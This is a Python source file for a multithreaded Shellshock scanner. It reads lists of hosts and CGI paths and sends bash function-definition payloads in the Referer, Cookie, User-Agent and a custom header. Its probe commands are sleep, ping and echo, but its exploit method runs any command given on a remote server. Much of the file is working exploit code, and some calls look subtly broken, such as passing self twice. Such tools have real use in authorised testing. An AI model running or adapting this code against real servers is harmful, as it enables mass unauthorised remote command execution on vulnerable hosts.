#  Copyright © 2022 Kalynovsky Valentin. All rights reserved.
#
#  Licensed under the Apache License, Version 2.0 (the "License");
#  you may not use this file except in compliance with the License.
#  You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
#  Unless required by applicable law or agreed to in writing, software
#  distributed under the License is distributed on an "AS IS" BASIS,
#  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#  See the License for the specific language governing permissions and
#  limitations under the License.

import http.client
import string
import sys
import time
import pprint
import csv
import argparse
from queue import Queue
from threading import Thread

from src.log import Log


class CGIBugScanner(object):
    SLEEP_TIME = 9
    SLEEP_DELAY = 5
    PING_PKTS = 9
    PING_DELAY = 7
    TEST_STRING = 'x4GryphF7'

    TIMEOUT = 10
    ERRORS_TO_ABORT = 8
    protocol = None
    target_results = []
    concurrent = 20
    PERSOHEADER = 'test'
    USER_AGENT = 'ShellShock-Scanner'
    EXPLOIT1 = '() { gry;};%s'
    EXPLOIT2 = '() { _; } >_[$($())] { %s; }'
    EXPLOIT = EXPLOIT2
    THREADS_DEFAULT = 20
    PROXY = None

    def request(self, target_host, path, headers):
        """
        If there's a proxy, use it. Otherwise, use the target host

        :param target_host: the hostname of the target server
        :param path: the path of the request, e.g. /api/v1/namespaces/default/pods
        :param headers: a dictionary of headers to send with the request
        :return: The status, reason, delay, and response.
        """
        if PROXY:
            if protocol:
                path = protocol + '://' + path
            elif target_host.endswith('443'):  # https for 443,9443,...
                path = 'https://' + target_host + path
            else:
                path = 'http://' + target_host + path
            conn = http.client.HTTPConnection(PROXY, timeout=self.TIMEOUT)
        else:
            if protocol == 'http':
                conn = http.client.HTTPConnection(target_host, timeout=self.TIMEOUT)
            elif protocol == 'https':
                conn = http.client.HTTPSConnection(target_host, timeout=self.TIMEOUT)
            elif target_host.endswith('443'):  # https for 443,9443,...
                conn = http.client.HTTPSConnection(target_host, timeout=self.TIMEOUT)
            else:
                conn = http.client.HTTPConnection(target_host, timeout=self.TIMEOUT)
        headers = headers
        start = time.time()
        conn.request("GET", path, headers=headers)
        res = conn.getresponse()
        end = time.time()
        delay = end - start

        return (res.status, res.reason, delay, res)

    def exploit(self, target_host, cgi_path, command):
        """
        It sends a POST request to the target host, with the command to be executed in the headers

        :param target_host: The host to attack
        :param cgi_path: The path to the CGI script you want to exploit
        :param command: The command to execute on the remote server
        :return: The exploit function is returning the request function.
        """
        shellcode = EXPLOIT % command

        headers = {"Content-type": "application/x-www-form-urlencoded",
                   "Referer": shellcode,
                   "Cookie": shellcode,
                   "User-Agent": shellcode,
                   self.PERSOHEADER: shellcode,
                   }
        return self.request(self, target_host, cgi_path, headers)

    def testShellShock(self, target_host, cgi_path, command):
        """
        The function takes in the target host, cgi path, and command to be executed. It then makes two requests, one with
        the command and one without. It then returns the results of the requests

        :param target_host: The host to test
        :param cgi_path: The path to the CGI script
        :param command: The command to be executed on the target host
        :return: a dictionary with the following keys: host, cgi_path, requests, vulnerable, warning, error, and delay_diff.
        """
        try:
            status1 = reason1 = delay1 = res1 = status2 = reason2 = delay2 = res2 = None
            command2 = command
            headers = {"Content-type": "application/x-www-form-urlencoded",
                       "User-Agent": self.USER_AGENT,
                       }
            print(target_host)
            status1, reason1, delay1, res1 = self.request(self, target_host, cgi_path, headers)
            # Executing the exploit function with the parameters of self, target_host, cgi_path, and command2.
            status2, reason2, delay2, res2 = self.exploit(self, target_host, cgi_path, command2)
            Log.out(status1)
            res1.close()
            res2.close()
            return {'host': target_host,
                    'cgi_path': cgi_path,
                    'requests': [('normal request', status1, reason1, delay1, res1),
                                 (command2, status2, reason2, delay2, res2)],
                    # 'vulnerable' : vulnerable,
                    # 'warning' : warning,
                    'vulnerable': None,
                    'warning': None,
                    'error': False,
                    'delay_diff': delay2 - delay1
                    }
        except Exception as e:
            # print e.__class__, e
            # Probably exception with the connection
            return {'host': target_host,
                    'cgi_path': cgi_path,
                    'requests': [('normal request', status1, reason1, delay1), (command2, status2, reason2, delay2)],
                    'vulnerable': False,
                    'warning': False,
                    'error': True,
                    'delay_diff': None
                    }

    def testSleep(self, target_host, cgi_path):
        """
        It tests if the target is vulnerable to the sleep test.

        :param target_host: The host to test
        :param cgi_path: The path to the CGI script you want to test
        :return: A dictionary with the following keys.
        """
        shellshocktest = self.testShellShock(target_host, cgi_path, "/usr/bin/env sleep %s" % self.SLEEP_TIME)
        if not shellshocktest['error']:
            shellshocktest['warning'] = shellshocktest['requests'][1][3] > self.SLEEP_TIME  # Delay command request > sleep time
            shellshocktest['vulnerable'] = shellshocktest['warning'] and shellshocktest['delay_diff'] > self.SLEEP_DELAY
            if shellshocktest['vulnerable']:
                Log.out("%s%s\t VULNERABLE TO SLEEP TEST" % (target_host, cgi_path))
            Log.out("%s%s - %s - %s - %s" % (
                target_host, cgi_path, "sleep test", "VULNERABLE" if shellshocktest['vulnerable'] else "False",
                shellshocktest['requests'][1][3]))
        return shellshocktest

    def testPing(self, target_host, cgi_path):
        """
        It tests if the target is vulnerable to the ping test.

        :param target_host: The host to test
        :param cgi_path: The path to the CGI script you want to test
        :return: A dictionary with the following keys:
            error: True if there was an error, False otherwise
            vulnerable: True if the target is vulnerable, False otherwise
            warning: True if there was a warning, False otherwise
            delay_diff: The difference between the delay command request and the sleep time
            requests: A list of tuples containing the following:
                0:
        """
        shellshocktest = self.testShellShock(target_host, cgi_path, "/usr/bin/env ping -c%s 127.0.0.1" % self.PING_PKTS)
        if not shellshocktest['error']:
            shellshocktest['warning'] = shellshocktest['requests'][1][3] > self.PING_DELAY  # Delay command request > sleep time
            shellshocktest['vulnerable'] = shellshocktest['warning'] and shellshocktest['delay_diff'] > self.PING_DELAY
            if shellshocktest['vulnerable']:
                Log.out("%s%s\t VULNERABLE TO PING TEST" % (target_host, cgi_path))
            Log.out("%s%s - %s - %s - %s" % (
                target_host, cgi_path, "ping test", "VULNERABLE" if shellshocktest['vulnerable'] else "False",
                shellshocktest['requests'][1][3]))
        return shellshocktest

    def testString(self, target_host, cgi_path):
        """
        It tests if the target is vulnerable to the shellshock bug.

        :param target_host: The host to test
        :param cgi_path: The path to the CGI script you want to test
        :return: A dictionary with the following keys:
        host
        cgi_path
        requests
        vulnerable
        warning
        error
        delay_diff
        """
        status = reason = delay = res = status = reason = delay = res2 = None
        command = 'echo -e "Content-type: text/html\\n\\n%s">&1' % self.TEST_STRING
        try:
            status, reason, delay, res = self.exploit(target_host, cgi_path, command)
            data = res.read()
            res.close()
            warning = vulnerable = self.TEST_STRING in data
            if vulnerable:
                Log.out("%s%s\t VULNERABLE TO STRING TEST" % (target_host, cgi_path))
            shellshocktest = {'host': target_host,
                              'cgi_path': cgi_path,
                              'requests': [(command, status, reason, delay, res), (None, None, None, None, None)],
                              'vulnerable': vulnerable,
                              'warning': warning,
                              'error': False,
                              'delay_diff': 0
                              }
            Log.out("%s%s - %s - %s - %s" % (
                target_host, cgi_path, "string test", "VULNERABLE" if shellshocktest['vulnerable'] else "False",
                shellshocktest['requests'][0][3]))
            return shellshocktest
        except Exception as e:
            # print e.__class__, e
            shellshocktest = {'host': target_host,
                              'cgi_path': cgi_path,
                              'requests': [(command, status, reason, delay, res), (None, None, None, None, None)],
                              'vulnerable': False,
                              'warning': False,
                              'error': True,
                              'delay_diff': 0
                              }

        if not shellshocktest['error']:
            shellshocktest['warning'] = shellshocktest['requests'][1][
                                            4] > self.PING_DELAY  # Delay command request > sleep time
            shellshocktest['vulnerable'] = shellshocktest['warning'] and shellshocktest['delay_diff'] > self.PING_DELAY
            if shellshocktest['vulnerable']:
                Log.out("%s%s\t VULNERABLE" % (target_host, cgi_path))
            Log.out("%s%s - %s - %s" % (
                target_host, cgi_path, shellshocktest['vulnerable'], shellshocktest['requests'][1][3]))
        return shellshocktest

    def testCGIList(self, target_host, cgi_list):
        """
        It loops through a list of CGI paths, and for each path, it runs three tests (sleep, ping, and string) and appends
        the results to a list

        :param target_host: The host to test
        :param cgi_list: A list of CGI paths to test
        :return: A list of dictionaries.
        """
        test_list = []
        errors = 0
        for cgi_path in cgi_list:
            if 1 in ATTACKS:
                cgitest = self.testSleep(target_host, cgi_path)
                test_list.append(cgitest)
                if cgitest['error'] is True:
                    errors += 1;
                else:
                    errors = 0
                if errors >= self.ERRORS_TO_ABORT:
                    Log.out(
                        "%s aborted due to %s consecutive connection errors" % (cgitest['host'], self.ERRORS_TO_ABORT))
                    break;

            if 2 in ATTACKS:
                cgitest = self.testPing(target_host, cgi_path)
                test_list.append(cgitest)
                if cgitest['error'] is True:
                    errors += 1;
                else:
                    errors = 0
                if errors >= self.ERRORS_TO_ABORT:
                    Log.out(
                        "%s aborted due to %s consecutive connection errors" % (cgitest['host'], self.ERRORS_TO_ABORT))
                    break;

            if 3 in ATTACKS:
                cgitest = self.testString(target_host, cgi_path)
                test_list.append(cgitest)
                if cgitest['error'] is True:
                    errors += 1;
                else:
                    errors = 0
                if errors >= self.ERRORS_TO_ABORT:
                    Log.out(
                        "%s aborted due to %s consecutive connection errors" % (cgitest['host'], self.ERRORS_TO_ABORT))
                    break;
        return test_list

    def threadWork(self):
        """
        It takes a target and a list of CGI scripts, tests each CGI script for vulnerabilities, and appends the results to a
        list
        """
        while True:
            (target, cgi_list) = q.get()
            host_tests = self.testCGIList(target, cgi_list)
            self.target_results.append(host_tests)
            q.task_done()

    def scan(self, target_list, cgi_list):
        """
        It takes a list of targets and a list of cgi scripts and then runs the threadWork function on each target and cgi
        script

        :param target_list: a list of targets to scan
        :param cgi_list: a list of cgi files to scan for
        :return: Nothing is being returned.
        """
        global q
        q = Queue(concurrent * 2)
        for i in range(concurrent):
            t = Thread(target=self.threadWork)
            t.daemon = True
            t.start()
        try:
            for target in target_list:
                q.put((target, cgi_list))
            q.join()
        except KeyboardInterrupt:
            return

    def writeCSV(self, target_results, output):
        """
        It takes a list of dictionaries, and writes the contents of each dictionary to a row in a CSV file

        :param target_results: This is the list of dictionaries that we created in the previous step
        :param output: The name of the file to write the results
        """
        csvf = open(output, 'w')
        csvw = csv.writer(csvf, csv.excel)
        csvw.writerow(['HOST', 'CGIPATH', 'VULNERABLE', 'ERROR', 'WARNING', 'COMMAND1', 'STATUS1', 'REASON1', 'DELAY1',
                       'COMMAND2', 'STATUS2', 'REASON2', 'DELAY2', 'DELAY_DIFF'])
        for host_list in target_results:
            for test in host_list:
                l = [
                    test['host'],
                    test['cgi_path'],
                    test['vulnerable'],
                    test['error'],
                    test['warning'],
                    test['requests'][0][0],
                    test['requests'][0][1],
                    test['requests'][0][2],
                    test['requests'][0][3],
                    test['requests'][1][0],
                    test['requests'][1][1],
                    test['requests'][1][2],
                    test['requests'][1][3],
                    test['delay_diff']
                ]
                csvw.writerow(l)

        csvf.close()

    def main(self, host_file, cgi_file, output_file):
        """
        main() takes in a host file, a cgi file, and an output file, and then scans the hosts for the cgis, and writes the
        results to the output file

        :param host_file: a file containing a list of hosts to scan
        :param cgi_file: The file containing the list of CGI scripts to scan
        :param output_file: The name of the file to write the results
        """
        hostlist_file = host_file
        cgilist_file = cgi_file
        # http|https
        proto = None
        threads = self.THREADS_DEFAULT
        output = output_file
        attacks = [1, 2]
        proxy = None
        exploit = 2

        global ATTACKS
        ATTACKS = attacks

        global EXPLOIT
        if exploit == 1:
            EXPLOIT = self.EXPLOIT1
        elif exploit == 2:
            EXPLOIT = self.EXPLOIT2

        global concurrent
        concurrent = threads

        global protocol
        protocol = proto

        global PROXY
        if proxy:
            PROXY = proxy

        target_list = [line.strip() for line in open(hostlist_file).readlines() if len(line.strip()) > 0]
        cgi_list = []
        with open(cgilist_file, "r") as fileInput:
            for row in csv.reader(fileInput):
                cgi_list.append(row[0])

        cgi_list = [line.strip() for line in open(cgilist_file).readlines() if len(line.strip()) > 0]

        cgi_list.pop(0)

        Log.out("Scanning %s hosts with %s CGIs using %s Threads" % (len(target_list), len(cgi_list), threads))
        Log.out("Attacks chosen: %s. Exploit payload: %s" % (ATTACKS, EXPLOIT % 'command'))
        if proxy:
            Log.out("Using proxy: %s" % PROXY)
        if protocol:
            Log.out("Forced protocol: %s" % protocol)

        self.scan(target_list, cgi_list)

        if output is None:
            output = "log.csv"
        Log.out("report file:"+output)
        self.writeCSV(self.target_results, output)
